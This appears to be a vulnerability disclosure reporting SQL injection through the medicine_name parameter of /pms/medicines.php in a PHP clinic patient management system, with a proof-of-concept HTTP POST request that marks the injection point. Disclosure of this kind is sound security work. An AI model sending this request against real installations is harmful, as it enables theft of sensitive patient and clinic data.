## Clinic's Patient Management System has SQL injection vulnerability

## submitter
zhangMingMing

## supplier
https://www.sourcecodester.com/php-clinics-patient-management-system-source-code
## Vulnerability file
/pms/medicines.php
## describe
Unrestricted SQL injection attacks exist in inventory management systems. The parameters that can be controlled are as follows: medicine_name, this function executes the medicine_name parameters into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.
## code analysis
The medicine_name parameter in medicines.php is controlled and is directly carried into the SQL statement for execution, resulting in SQL injection.

<img width="1301" alt="image" src="https://github.com/user-attachments/assets/a4a6f81d-066a-48bc-8128-9fd3c3c2d22d">

Injection via the parameter medicine_name
POC
```
POST /pms/medicines.php?message=Medicine%20added%20successfully. HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 88
Origin: http://localhost
Connection: close
Referer: http://localhost/pms/medicines.php?message=Medicine%20added%20successfully.
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

medicine_name=22*&save_medicine=
```
<img width="1692" alt="image" src="https://github.com/user-attachments/assets/1bfe0b13-a90d-4d14-84fd-71b1fda15d9b">

<img width="1117" alt="image" src="https://github.com/user-attachments/assets/b2737689-82c6-4a72-9410-a954dd145a3c">







